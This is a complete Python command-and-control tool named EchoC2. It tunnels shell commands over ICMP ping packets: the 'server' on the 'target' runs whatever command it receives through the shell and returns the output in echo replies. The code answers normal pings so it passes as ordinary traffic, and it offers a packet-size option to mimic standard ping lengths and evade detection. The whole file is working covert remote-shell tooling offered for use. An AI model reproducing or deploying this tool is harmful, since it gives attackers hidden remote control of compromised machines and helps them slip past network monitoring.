################################
#                              #
#   Created by @RickConsole    #
#     The Emperor Protects     #
#                              #
################################

import subprocess
import socket
import struct
import select
import sys
import os
import time
import argparse

GREEN = "\033[92m"
BLUE = "\033[94m"
RED = "\033[91m"
RESET = "\033[0m"
COMMAND_PREFIX = b"CMD_EXEC:"
RESPONSE_PREFIX = b"CMD_RESPONSE:"
POLL_PREFIX = b"CMD_POLL:"
MAX_RESPONSES = 100         # Max number of response packets to wait for
TIMEOUT = 10                # Timeout when waiting for responses

MAX_PACKET_SIZE = 1024      # Max size of ICMP packets. Larger number = less ICMP replies
                            # Set MAX_PACKET_SIZE to 84 to maintain a standard 98 byte reply

ICMP_HEADER_SIZE = 8
IP_HEADER_SIZE = 20
PAYLOAD_SIZE = MAX_PACKET_SIZE - IP_HEADER_SIZE - ICMP_HEADER_SIZE
FRAGMENT_HEADER_SIZE = 4
FRAGMENT_SIZE = PAYLOAD_SIZE - FRAGMENT_HEADER_SIZE - len(RESPONSE_PREFIX)



parser = argparse.ArgumentParser(description='EchoC2')
parser.add_argument('mode', choices=['client', 'server'], help='Run as client or server')
parser.add_argument('--size', type=int, default=1024,
                        help='Max packet size (default: 1024). Use 84 to mimic standard ICMP packet lengths.')
parser.add_argument('--debug', action='store_true', help='Enable debug logging')
parser.add_argument('target', nargs='?', help='Target IP address (required for client mode)')
args = parser.parse_args()

DEBUG = args.debug

def log(message):
    if DEBUG:
        print(f"{RED}[DEBUG]{RESET} {message}", file=sys.stderr, flush=True)

def calculate_checksum(packet):
    if len(packet) % 2 != 0:
        packet += b'\0'
    
    checksum = 0
    for i in range(0, len(packet), 2):
        checksum += (packet[i] << 8) + packet[i+1]
    
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = ~checksum & 0xffff
    return checksum

def create_icmp_socket():
    try:
        return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        log("Error: This script requires root privileges. Please run with sudo.")
        sys.exit(1)

def send_icmp_echo(dest_addr, data, icmp_id=None, icmp_seq=1):
    icmp_socket = create_icmp_socket()
    icmp_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
    
    icmp_type, icmp_code = 8, 0  
    icmp_checksum = 0
    icmp_id = icmp_id or (os.getpid() & 0xFFFF)
    
    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    checksum = calculate_checksum(icmp_header + data)
    icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
    
    packet = icmp_header + data
    log(f"Sending ICMP Echo Request to {dest_addr} with ID: {icmp_id}, Sequence: {icmp_seq}")
    log(f"Payload: {data}")
    try:
        sent = icmp_socket.sendto(packet, (dest_addr, 0))
        log(f"Sent {sent} bytes")
    except Exception as e:
        log(f"Error sending packet: {e}")
    
    return icmp_socket, icmp_id


def receive_icmp_echo(icmp_socket, expected_id, timeout=TIMEOUT, max_responses=MAX_RESPONSES):
    log(f"Waiting for up to {max_responses} ICMP Echo Replies with ID: {expected_id}")
    start_time = time.time()
    responses = []
    fragments = {}
    total_fragments = None
    while time.time() - start_time < timeout and len(responses) < max_responses:
        ready = select.select([icmp_socket], [], [], timeout - (time.time() - start_time))
        if ready[0]:
            try:
                rec_packet, addr = icmp_socket.recvfrom(MAX_PACKET_SIZE)
                ip_header = rec_packet[:IP_HEADER_SIZE]
                icmp_header = rec_packet[IP_HEADER_SIZE:IP_HEADER_SIZE + ICMP_HEADER_SIZE]
                icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', icmp_header)
                
                log(f"Received ICMP packet from {addr}. Type: {icmp_type}, ID: {p_id}, Sequence: {sequence}")
                
                if icmp_type == 0 and p_id == expected_id:  # Echo Reply
                    payload = rec_packet[IP_HEADER_SIZE + ICMP_HEADER_SIZE:]
                    if payload.startswith(COMMAND_PREFIX):
                        responses.append((icmp_type, payload))
                    elif len(payload) >= FRAGMENT_HEADER_SIZE:  # Fragmented response
                        fragment_number, total_fragments = struct.unpack("!HH", payload[:FRAGMENT_HEADER_SIZE])
                        fragment_data = payload[FRAGMENT_HEADER_SIZE:].rstrip(b'\0')  # Remove padding
                        if fragment_data.startswith(RESPONSE_PREFIX):
                            fragment_data = fragment_data[len(RESPONSE_PREFIX):]
                        fragments[fragment_number] = fragment_data
                        if len(fragments) == total_fragments:
                            complete_payload = b''.join([fragments[i] for i in range(total_fragments)])
                            responses.append((icmp_type, RESPONSE_PREFIX + complete_payload))
                            fragments.clear()
                    if len(responses) == max_responses:
                        log(f"Received maximum number of responses ({max_responses})")
                        break
                else:
                    log(f"Received unexpected ICMP packet. Type: {icmp_type}, ID: {p_id}")
            except Exception as e:
                log(f"Error receiving packet: {e}")
    
    if not responses:
        log("Timeout waiting for ICMP Echo Reply")
    return responses

def execute_command(command):
    log(f"Executing command: {command}")
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        log(f"Command output: {output}")
        return output
    except subprocess.CalledProcessError as e:
        log(f"Command failed with error: {e.output}")
        return e.output

# Server (target)
def server():
    log("Starting server...")
    icmp_socket = create_icmp_socket()
    icmp_socket.bind(("0.0.0.0", 0))
    
    while True:
        log("Waiting for incoming ICMP packet...")
        try:
            packet, addr = icmp_socket.recvfrom(MAX_PACKET_SIZE)
            ip_header = packet[:20]
            icmp_header = packet[20:28]
            icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', icmp_header)
            
            icmp_data = packet[28:]
            log(f"Received ICMP packet from {addr}. Type: {icmp_type}, ID: {p_id}, Sequence: {sequence}")
            log(f"Payload: {icmp_data}")
            
            if icmp_type == 8:  
                if icmp_data.startswith(COMMAND_PREFIX):
                    log(f"Processing command from {addr}")
                    command = icmp_data[len(COMMAND_PREFIX):].decode().strip()
                    log(f"Extracted command: {command}")
                    
                    output = execute_command(command)
                    log(f"Command output length: {len(output)}")
                    
                    # Fragment the response if necessary
                    fragments = [output[i:i+FRAGMENT_SIZE] for i in range(0, len(output), FRAGMENT_SIZE)]
                    total_fragments = len(fragments)
                    
                    for i, fragment in enumerate(fragments):
                        response = struct.pack("!HH", i, total_fragments) + RESPONSE_PREFIX + fragment
                        
                        reply_header = struct.pack("!BBHHH", 0, 0, 0, p_id, sequence + i)
                        reply_checksum = calculate_checksum(reply_header + response)
                        reply_header = struct.pack("!BBHHH", 0, 0, reply_checksum, p_id, sequence + i)
                        reply_packet = reply_header + response
                        
                        log(f"Sending fragment {i+1}/{total_fragments}. Length: {len(reply_packet)}")
                        icmp_socket.sendto(reply_packet, addr)
                        
                else:
                    log(f"Responding to regular ping from {addr}")
                    response = icmp_data
                    reply_header = struct.pack("!BBHHH", 0, 0, 0, p_id, sequence)
                    reply_checksum = calculate_checksum(reply_header + response)
                    reply_header = struct.pack("!BBHHH", 0, 0, reply_checksum, p_id, sequence)
                    reply_packet = reply_header + response
                    icmp_socket.sendto(reply_packet, addr)
            else:
                log(f"Ignoring non-Echo Request ICMP packet. Type: {icmp_type}")
        except Exception as e:
            log(f"Error in server loop: {e}")

# Client (attacker)
def client(dest_addr):
    icmp_id = os.getpid() & 0xFFFF
    seq = 0
    while True:
        command = input(f"{GREEN}EchoC2>{RESET} ")
        if command.lower() == 'exit':
            break
        
        seq += 1
        full_command = COMMAND_PREFIX + command.encode()
        icmp_socket, sent_id = send_icmp_echo(dest_addr, full_command, icmp_id, seq)
        
        responses = receive_icmp_echo(icmp_socket, sent_id, max_responses=2)
        icmp_socket.close()
        
        ack_response = None
        cmd_response = None
        
        for icmp_type, response in responses:
            try:
                if response.startswith(COMMAND_PREFIX):
                    ack_response = response[len(COMMAND_PREFIX):].decode(errors='replace').strip()
                elif response.startswith(RESPONSE_PREFIX):
                    cmd_response = response[len(RESPONSE_PREFIX):].decode(errors='replace').strip()
                else:
                    log(f"Unexpected response format: {response[:50]}...")
            except Exception as e:
                log(f"Error processing response: {e}")
        
        if ack_response:
            print(f"\n{BLUE}[*]{RESET} Command Acknowledgement:")
            print(f"Server received: {ack_response}")
        else:
            print(f"\n{RED}[WARN]{RESET} No command acknowledgement received")
        
        if cmd_response:
            print(f"\n{BLUE}[*]{RESET} Command Output:")
            print(cmd_response)
        else:
            print(f"\n{RED}[WARN]{RESET} No command output received")
        
        if not responses:
            print(f"{RED}[WARN]{RESET} No valid responses received")
        
        print()  # Blank line for readability

if __name__ == "__main__":
    MAX_PACKET_SIZE = args.size
    if args.mode == "server":
        server()
    elif args.mode == "client":
        if not args.target:
            parser.error("Client mode requires a target IP address")
        print("""
  _____     _            ____ ____  
 | ____|___| |__   ___  / ___|___ \ 
 |  _| / __| '_ \ / _ \| |     __) |
 | |__| (__| | | | (_) | |___ / __/ 
 |_____\___|_| |_|\___/ \____|_____|
                                    """)
        print("Welcome to EchoC2. Use 'exit' to quit.\n")
        client(args.target)
    else:
        parser.error("Invalid mode. Use 'client' or 'server'.")